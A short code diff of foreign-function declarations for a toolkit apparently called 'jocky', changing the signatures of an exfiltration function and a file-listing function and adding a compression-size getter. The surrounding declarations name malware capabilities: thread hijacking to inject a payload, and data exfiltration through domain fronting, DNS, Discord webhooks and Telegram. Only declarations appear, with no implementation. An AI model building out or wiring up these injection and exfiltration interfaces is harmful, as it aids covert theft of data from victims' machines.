@@ -71,7 +71,7 @@ ffi jocky_thread_hijack(pid: i32, payload: i8*, payload_size: i32) -> bool;
 
 // ---- Exfiltration ----
 ffi jocky_exfil_encrypt(data: i8*, size: i32, key: i8*, keylen: i32) -> void;
-ffi jocky_exfil_front(front_domain: string, real_host: string, path: string, data: i8*, size: i32) -> bool;
+ffi jocky_exfil_front(endpoint: string, token: string, data: string, method: string, chunk_size: i32) -> bool;
 ffi jocky_exfil_dns(domain: string, data: i8*, size: i32) -> bool;
 ffi jocky_exfil_discord(webhook: string, data: i8*, size: i32) -> bool;
 ffi jocky_exfil_telegram(token: string, chat_id: string, data: i8*, size: i32) -> bool;
@@ -123,7 +123,7 @@ ffi forensic_timeline_from_logs() -> i8*;
 
 // ---- Filesystem ----
 ffi fs_exists(path: string) -> bool;
-ffi fs_list_files(path: string, recursive: bool) -> [string];
+ffi fs_list_files(path: string, recursive: bool) -> string;
 ffi fs_file_size(path: string) -> i64;
 ffi fs_read_file(path: string) -> i8*;
 ffi fs_write_file(path: string, data: i8*, size: i64) -> bool;
@@ -220,6 +220,7 @@ ffi jocky_http_get(url: string, out_buf: i8*, max_size: i64) -> i64;
 ffi jocky_http_post(url: string, data: i8*, data_size: i32, headers: string) -> bool;
 ffi jocky_download_file(url: string, dest_path: string) -> bool;
 ffi jocky_compress_data(data: i8*, size: i32) -> i8*;
+ffi jocky_compress_get_size() -> i32;
 ffi jocky_decompress_data(data: i8*, size: i32) -> i8*;
 
 // ---- Windows Registry Advanced ----
